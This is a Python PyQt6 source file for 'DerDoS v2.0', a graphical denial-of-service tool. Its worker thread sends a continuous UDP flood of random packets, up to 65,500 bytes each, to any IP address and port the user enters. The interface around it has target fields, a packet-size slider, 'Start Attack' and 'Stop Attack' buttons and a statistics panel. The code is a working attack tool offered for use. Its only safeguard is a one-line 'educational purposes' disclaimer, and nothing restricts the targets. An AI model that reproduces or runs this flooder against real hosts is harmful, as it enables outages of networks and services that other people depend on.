
import sys
import os
import socket

from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QSettings, QSize
from PyQt6.QtGui import QIcon, QFont, QIntValidator
from PyQt6.QtWidgets import QApplication, QVBoxLayout, QHBoxLayout, QWidget

from qfluentwidgets import (
    FluentWindow, setTheme, Theme, SubtitleLabel, LineEdit, Slider, 
    PrimaryPushButton, PushButton, TextEdit, ProgressBar, BodyLabel,
    CardWidget, InfoBar, InfoBarPosition, FluentIcon as FIF,
    setThemeColor, StrongBodyLabel, SimpleCardWidget, TitleLabel,
    ToolButton, NavigationItemPosition, ComboBox, LargeTitleLabel,
    SettingCardGroup, SettingCard, DropDownPushButton, RoundMenu, Action,
    CompactSpinBox, SplashScreen, HyperlinkCard
)

class ProgressThread(QThread):
    progress_updated = pyqtSignal(int)
    def run(self):
        for i in range(101):
            self.progress_updated.emit(i)
            QThread.msleep(20)

class WorkerThread(QThread):
    error_occurred = pyqtSignal(str)
    def __init__(self, target_ip, target_port, packet_size, parent=None):
        super().__init__(parent)
        self.target_ip_global = target_ip
        self.target_port_global = target_port
        self.packet_size_global = packet_size
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(self.packet_size_global)
            while self.running:
                try:
                    sent = s.sendto(data, (self.target_ip_global, self.target_port_global))
                    self.packets_sent += 1
                    self.bytes_sent += sent
                except Exception:
                    pass
        except Exception as e:
            self.error_occurred.emit(str(e))
    def stop(self):
        self.running = False


class SettingsWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setObjectName('SettingsWidget')
        self.app_settings = QSettings("ATOMIC09", "DerDos")
        
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(36, 36, 36, 36)
        self.main_layout.setSpacing(10)
        
        self.title = LargeTitleLabel('Settings')
        self.main_layout.addWidget(self.title)
        self.main_layout.addSpacing(20)
        
        self.appearance_group = SettingCardGroup('Appearance', self)
        self.theme_card = SettingCard(FIF.BRUSH, 'App theme', 'Select which app theme to display')
        
        saved_theme = self.app_settings.value("theme", "Auto")
        self.theme_btn = DropDownPushButton(saved_theme)
        
        # Remove parent reference from button and fix qt shadow flags to prevent nested border
        self.theme_menu = RoundMenu(parent=self.window())
        self.theme_menu.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        self.theme_menu.setWindowFlags(self.theme_menu.windowFlags() | Qt.WindowType.FramelessWindowHint | Qt.WindowType.NoDropShadowWindowHint)
        
        for theme in ['Auto', 'Light', 'Dark']:
            action = Action(theme)
            action.triggered.connect(lambda checked, t=theme: self.on_theme_changed(t))
            self.theme_menu.addAction(action)
            
        self.theme_btn.setMenu(self.theme_menu)
        
        self.theme_card.hBoxLayout.addWidget(self.theme_btn)
        self.theme_card.hBoxLayout.addSpacing(16)
        
        self.appearance_group.addSettingCard(self.theme_card)
        self.main_layout.addWidget(self.appearance_group)
        
        self.about_group = SettingCardGroup('About', self)
        self.about_card = SettingCard(FIF.INFO, 'About app', 'DerDos Version 2.0\nLicensed under the GPLv3 License')
        
        self.license_btn = PushButton('View License')
        self.license_btn.clicked.connect(lambda: os.startfile('LICENSE') if os.path.exists('LICENSE') else None)
        self.about_card.hBoxLayout.addWidget(self.license_btn)
        self.about_card.hBoxLayout.addSpacing(16)
        
        self.about_group.addSettingCard(self.about_card)
        
        # HyperlinkCard(url, text, icon, title, content)
        self.source_code_card = HyperlinkCard(
            "https://github.com/ATOMIC09/DerDoS",
            "Open GitHub",
            FIF.LINK,
            "Source code",
            "View the repository for this project on GitHub"
        )
        self.about_group.addSettingCard(self.source_code_card)
        
        self.main_layout.addWidget(self.about_group)
        
        self.main_layout.addStretch()
        
    def on_theme_changed(self, text):
        self.theme_btn.setText(text)
        self.app_settings.setValue("theme", text)
        if text == 'Light':
            setTheme(Theme.LIGHT)
        elif text == 'Dark':
            setTheme(Theme.DARK)
        else:
            setTheme(Theme.AUTO)


class AttackWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.setObjectName('AttackWidget')
        
        self.master_layout = QVBoxLayout(self)
        self.master_layout.setContentsMargins(36, 36, 36, 36)
        self.master_layout.setSpacing(24)
        
        self.header_label = LargeTitleLabel('DerDoS')
        self.master_layout.addWidget(self.header_label)
        
        self.main_layout = QHBoxLayout()
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(24)
        
        self.master_layout.addLayout(self.main_layout)
        
        self.left_panel = QWidget()
        self.left_layout = QVBoxLayout(self.left_panel)
        self.left_layout.setContentsMargins(0, 0, 0, 0)
        self.left_layout.setSpacing(20)
        
        self.title_label = SubtitleLabel('Attack Configuration')
        self.left_layout.addWidget(self.title_label)
        
        self.config_card = SimpleCardWidget()
        self.config_layout = QVBoxLayout(self.config_card)
        self.config_layout.setContentsMargins(20, 24, 20, 24)
        self.config_layout.setSpacing(20)
        
        self.conn_layout = QHBoxLayout()
        self.conn_layout.setSpacing(16)
        
        self.ip_layout = QVBoxLayout()
        self.ip_label = StrongBodyLabel('Target IP Address')
        self.ip_input = LineEdit()
        self.ip_input.setPlaceholderText('e.g. 192.168.1.1')
        self.ip_input.setClearButtonEnabled(True)
        self.ip_layout.addWidget(self.ip_label)
        self.ip_layout.addSpacing(4)
        self.ip_layout.addWidget(self.ip_input)
        
        self.port_layout = QVBoxLayout()
        self.port_label = StrongBodyLabel('Port')
        self.port_input = LineEdit()
        self.port_input.setPlaceholderText('e.g. 80')
        self.port_input.setClearButtonEnabled(True)
        self.port_input.setFixedWidth(120)
        self.port_layout.addWidget(self.port_label)
        self.port_layout.addSpacing(4)
        self.port_layout.addWidget(self.port_input)
        
        self.conn_layout.addLayout(self.ip_layout)
        self.conn_layout.addLayout(self.port_layout)
        self.config_layout.addLayout(self.conn_layout)
        
        self.packet_layout = QVBoxLayout()
        self.packet_header = QHBoxLayout()
        self.packet_label = StrongBodyLabel('Packet Size')
        
        self.packet_input_layout = QHBoxLayout()
        self.packet_input_layout.setSpacing(8)
        
        self.packet_input = LineEdit()
        self.packet_input.setValidator(QIntValidator(1024, 65500))
        self.packet_input.setText('9216')
        self.packet_input.setFixedWidth(100)
        
        self.unit_label = BodyLabel('bytes')
        self.unit_label.setTextColor('#FFFFFF', '#FFFFFF')
        
        self.packet_input_layout.addStretch()
        self.packet_input_layout.addWidget(self.packet_input)
        self.packet_input_layout.addWidget(self.unit_label)
        
        self.packet_header.addWidget(self.packet_label)
        self.packet_header.addStretch()
        self.packet_header.addLayout(self.packet_input_layout)
        
        self.packet_slider = Slider(Qt.Orientation.Horizontal)
        self.packet_slider.setMinimum(1024)
        self.packet_slider.setMaximum(65500)
        self.packet_slider.setValue(9216)
        
        def on_input_changed():
            val = self.packet_input.text()
            if val:
                self.packet_slider.setValue(int(val))
                
        def on_slider_changed(v):
            self.packet_input.setText(str(v))
            
        self.packet_input.textChanged.connect(on_input_changed)
        self.packet_slider.valueChanged.connect(on_slider_changed)
        
        self.packet_layout.addLayout(self.packet_header)
        self.packet_layout.addSpacing(8)
        self.packet_layout.addWidget(self.packet_slider)
        self.config_layout.addLayout(self.packet_layout)
        
        self.left_layout.addWidget(self.config_card)
        
        self.action_card = SimpleCardWidget()
        self.action_layout = QVBoxLayout(self.action_card)
        self.action_layout.setContentsMargins(20, 24, 20, 24)
        self.action_layout.setSpacing(20)
        
        self.stats_label = StrongBodyLabel('Statistics')
        self.action_layout.addWidget(self.stats_label)
        
        self.stats_data_layout = QHBoxLayout()
        
        self.packets_vbox = QVBoxLayout()
        self.packets_vbox.addWidget(BodyLabel('Packets Sent'))
        self.packets_sent_num = StrongBodyLabel('0')
        self.packets_vbox.addWidget(self.packets_sent_num)
        
        self.data_vbox = QVBoxLayout()
        self.data_vbox.addWidget(BodyLabel('Data Transferred'))
        self.data_sent_num = StrongBodyLabel('0.00 MB')
        self.data_vbox.addWidget(self.data_sent_num)
        
        self.stats_data_layout.addLayout(self.packets_vbox)
        self.stats_data_layout.addLayout(self.data_vbox)
        self.action_layout.addLayout(self.stats_data_layout)
        
        self.buttons_layout = QHBoxLayout()
        self.btn_attack = PrimaryPushButton(FIF.PLAY, 'Start Attack')
        self.btn_attack.setFixedHeight(40)
        self.btn_stop = PushButton(FIF.CANCEL, 'Stop Attack')
        self.btn_stop.setFixedHeight(40)
        self.btn_stop.setEnabled(False)
        self.buttons_layout.addWidget(self.btn_attack)
        self.buttons_layout.addWidget(self.btn_stop)
        self.action_layout.addLayout(self.buttons_layout)
        
        self.left_layout.addWidget(self.action_card)
        self.left_layout.addStretch()
        
        self.right_panel = QWidget()
        self.right_layout = QVBoxLayout(self.right_panel)
        self.right_layout.setContentsMargins(0, 0, 0, 0)
        self.right_layout.setSpacing(16)
        
        self.log_header_layout = QHBoxLayout()
        self.log_title = SubtitleLabel('Terminal Output')
        self.btn_clear = ToolButton(FIF.DELETE)
        self.btn_clear.clicked.connect(self.clear_log)
        self.btn_clear.setToolTip('Clear Output')
        
        self.log_header_layout.addWidget(self.log_title)
        self.log_header_layout.addStretch()
        self.log_header_layout.addWidget(self.btn_clear)
        self.right_layout.addLayout(self.log_header_layout)
        
        self.terminal_card = CardWidget()
        self.terminal_layout = QVBoxLayout(self.terminal_card)
        self.terminal_layout.setContentsMargins(2, 2, 2, 2)
        
        self.text_edit = TextEdit()
        self.text_edit.setReadOnly(True)
        font = QFont('Consolas', 10)
        font.setStyleHint(QFont.StyleHint.TypeWriter)
        self.text_edit.setFont(font)
        self.text_edit.setStyleSheet('QTextEdit { border: none; background-color: transparent; }')
        
        self.terminal_layout.addWidget(self.text_edit)
        self.right_layout.addWidget(self.terminal_card)
        
        self.progress_bar = ProgressBar()
        self.progress_bar.setValue(0)
        self.right_layout.addWidget(self.progress_bar)
        
        self.main_layout.addWidget(self.left_panel, 1)
        self.main_layout.addWidget(self.right_panel, 1)
        
        self.btn_attack.clicked.connect(self.shoot)
        self.btn_stop.clicked.connect(self.stop_attack)
        
        self.clear_log()
        self.worker = None

    def clear_log(self):
        self.text_edit.clear()
        self.text_edit.append('Welcome to DerDoS v2.0\n')
        self.text_edit.append('[!] WARNING: This tool should only be used for educational purposes and network testing.\n')
        self.text_edit.append('Ready...')
        
    def shoot(self):
        if not self.ip_input.text() or not self.port_input.text():
            InfoBar.error('Missing Input', 'Please enter both IP Address and Port number', position=InfoBarPosition.TOP_RIGHT, parent=self)
            return
        try:
            port_num = int(self.port_input.text())
            if not (1 <= port_num <= 65535):
                InfoBar.error('Invalid Port', 'Port must be between 1 and 65535', position=InfoBarPosition.TOP_RIGHT, parent=self)
                return
            socket.inet_aton(self.ip_input.text())
        except ValueError:
            InfoBar.error('Invalid Port', 'Port must be a number', position=InfoBarPosition.TOP_RIGHT, parent=self)
            return
        except socket.error:
            InfoBar.error('Invalid IP', 'Invalid IP address format', position=InfoBarPosition.TOP_RIGHT, parent=self)
            return
            
        self.ip_input.setEnabled(False)
        self.port_input.setEnabled(False)
        self.packet_slider.setEnabled(False)
        self.packet_input.setEnabled(False)
        self.btn_attack.setEnabled(False)
        self.btn_clear.setEnabled(False)
        
        target_ip = self.ip_input.text()
        target_port = port_num
        packet_size = self.packet_slider.value()
        
        self.packets_sent_num.setText('0')
        self.data_sent_num.setText('0.00 MB')
        
        self.text_edit.append(f'\n> Organizing payload for {target_ip}:{target_port}')
        self.text_edit.append(f'> Payload Size: {packet_size} bytes')
        self.text_edit.append('> Initializing thread pool...')
        
        self.worker = WorkerThread(target_ip, target_port, packet_size)
        self.worker.error_occurred.connect(self.handle_error)
        
        self.progress_thread = ProgressThread()
        self.progress_thread.progress_updated.connect(self.progress_bar.setValue)
        self.progress_thread.finished.connect(self.start_attack)
        self.progress_thread.start()

    def start_attack(self):
        self.text_edit.append('> Attack sequence initiated.')
        self.text_edit.append('> Flooding traffic...\n')
        self.btn_stop.setEnabled(True)
        self.worker.start()
        
        self.stats_timer = QTimer(self)
        self.stats_timer.timeout.connect(self.update_stats)
        self.stats_timer.start(1000)

    def handle_error(self, err_msg):
        self.text_edit.append(f'\n[ERROR] {err_msg}')
        self.stop_attack()

    def update_stats(self):
        if self.worker:
            self.packets_sent_num.setText(f'{self.worker.packets_sent:,}')
            self.data_sent_num.setText(f'{self.worker.bytes_sent / (1024*1024):.2f} MB')

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.wait()
            try:
                self.stats_timer.stop()
            except Exception:
                pass
            
        self.progress_bar.setValue(0)
        self.text_edit.append('\n> Attack halted by user.')
        self.text_edit.append('Ready... \n')
        self.ip_input.setEnabled(True)
        self.port_input.setEnabled(True)
        self.packet_slider.setEnabled(True)
        self.packet_input.setEnabled(True)
        self.btn_attack.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.btn_clear.setEnabled(True)

class MainWindow(FluentWindow):
    def __init__(self):
        super().__init__()
        
        self.app_settings = QSettings("ATOMIC09", "DerDos")
        saved_theme = self.app_settings.value("theme", "Auto")
        if saved_theme == 'Light':
            setTheme(Theme.LIGHT)
        elif saved_theme == 'Dark':
            setTheme(Theme.DARK)
        else:
            setTheme(Theme.AUTO)
            
        setThemeColor('#0078D4')
        self.setWindowTitle('DerDos')
        
        icon_path = 'derdos_builder/asset/windows-logo.ico'
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
            
        # Initialize Splash Screen
        self.splashScreen = SplashScreen(self.windowIcon(), self)
        self.splashScreen.setIconSize(QSize(102, 102))
        self.splashScreen.raise_()
        
        self.resize(1100, 750)
        self.setMinimumSize(850, 600)
        
        self.navigationInterface.setExpandWidth(200)
        
        self.attack_suite = AttackWidget()
        self.settings = SettingsWidget()
        
        self.initNavigation()
        
        # Hide the splash screen
        self.splashScreen.finish()
        
    def initNavigation(self):
        self.addSubInterface(self.attack_suite, FIF.COMMAND_PROMPT, 'Attack Suite')
        self.navigationInterface.addSeparator(NavigationItemPosition.BOTTOM)
        self.addSubInterface(self.settings, FIF.SETTING, 'Settings', NavigationItemPosition.BOTTOM)
        
        self.switchTo(self.attack_suite)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())

